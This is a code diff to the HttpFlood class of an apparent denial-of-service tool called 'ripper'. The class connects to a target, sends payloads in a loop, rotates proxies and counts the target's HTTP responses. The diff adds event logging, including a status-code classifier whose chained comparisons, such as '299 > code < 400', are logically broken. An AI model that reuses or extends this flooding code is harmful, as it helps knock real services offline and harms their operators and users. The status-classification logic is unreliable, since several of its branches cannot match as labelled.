@@ -6,13 +6,15 @@ from typing import Any
 from socks import ProxyError
 
 from ripper.constants import HTTP_STATUS_CODE_CHECK_PERIOD_SEC
-from ripper.context.errors import Errors
+from ripper.context.events_journal import EventsJournal
 from ripper.context.target import Target
 from ripper.actions.attack_method import AttackMethod
 
 HTTP_STATUS_PATTERN = re.compile(r" (\d{3}) ")
 # Forward Reference
 Context = 'Context'
+
+Events = EventsJournal()
 
 
 class HttpFlood(AttackMethod):
@@ -40,10 +42,12 @@ class HttpFlood(AttackMethod):
         with suppress(Exception), self.create_connection() as self._http_connect:
             self._http_connect.connect(self._target.hostip_port_tuple())
             self._ctx.target.statistic.connect.status_success()
+            Events.info('Creating HTTP connection...')
             while self.send(self._http_connect):
                 if self._ctx.dry_run:
                     break
                 continue
+            self._ctx.target.statistic.connect.status_failed()
 
     def check_response_status(self, payload: bytes):
         with suppress(Exception):
@@ -55,6 +59,39 @@ class HttpFlood(AttackMethod):
                 check_sock.close()
                 status = int(re.search(HTTP_STATUS_PATTERN, http_response)[1])
                 self._ctx.target.statistic.http_stats[status] += 1
+                self._send_event_with_status(status)
+
+    @staticmethod
+    def _send_event_with_status(code: int):
+        base = 'Checked Response status...'
+        if code < 300:
+            Events.info(f'{base} {code}: Success')
+        elif 299 > code < 400:
+            Events.warn(f'{base} {code}: Redirection')
+        elif code == 400:
+            Events.warn(f'{base} {code}: Bad Request')
+        elif 400 > code <= 403:
+            Events.warn(f'{base} {code}: Forbidden')
+        elif code == 404:
+            Events.warn(f'{base} {code}: Not Found')
+        elif 404 > code < 408:
+            Events.warn(f'{base} {code}: Not Acceptable or Not Allowed')
+        elif code == 408:
+            Events.warn(f'{base} {code}: Request Timeout')
+        elif 408 > code < 429:
+            Events.error(f'{base} {code}: Client Error')
+        elif code == 429:
+            Events.error(f'{base} {code}: Too Many Requests')
+        elif 429 > code < 459:
+            Events.error(f'{base} {code}: Client Error')
+        elif 460 >= code <= 463:
+            Events.error(f'{base} {code}: AWS Load Balancer Error')
+        elif 499 > code <= 511:
+            Events.error(f'{base} {code}: Server Error')
+        elif 520 >= code <= 530:
+            Events.error(f'{base} {code}: CloudFlare Reverse Proxy Error')
+        else:
+            Events.error(f'{base} {code}: Custom Error')
 
     def send(self, sock: socket) -> bool:
         payload = self.payload().encode('utf-8')
@@ -64,8 +101,7 @@ class HttpFlood(AttackMethod):
         except ProxyError:
             self._ctx.proxy_manager.delete_proxy_sync(self._proxy)
         except Exception as e:
-            self._ctx.add_error(Errors('HTTP send Err', e))
-            self._ctx.target.statistic.connect.status_failed()
+            Events.exception(e)
         else:
             self._ctx.target.statistic.packets.status_sent(sent)
             self._proxy.report_success() if self._proxy is not None else 0
